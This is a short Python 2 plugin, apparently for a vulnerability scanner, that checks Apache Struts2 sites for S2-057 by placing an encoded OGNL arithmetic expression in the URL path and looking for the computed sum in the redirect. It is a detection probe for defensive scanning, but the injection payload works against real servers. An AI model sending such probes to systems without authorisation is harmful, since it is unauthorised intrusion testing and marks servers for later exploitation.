# refer:https://github.com/Ivan1ee/struts2-057-exp
import urlparse
import random


def assign(service, arg):
    if service == 'struts':
        return True, arg


def audit(arg):
    p = urlparse.urlparse(arg)
    path, suffix = p.path.rsplit("/", 1)
    rand1 = random.randint(254, 512)
    rand2 = random.randint(512, 1024)
    sumary = rand1 + rand2
    payload = path + "/" + "%%24%%7b%d+%d%%7d" % (rand1, rand2) + "/" + suffix
    url = "%s://%s/%s" % (p.scheme, p.netloc, payload.lstrip("/"))
    # print url
    code, head, html, redirect_url, log = hackhttp.http(url, headers={
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"})
    if str(sumary) in redirect_url:
        security_hole("S2-057 vulnerability exists in the website: " + url)


if __name__ == '__main__':
    from dummy import *
    audit("http://127.0.0.1:8081/actionChain1.action")
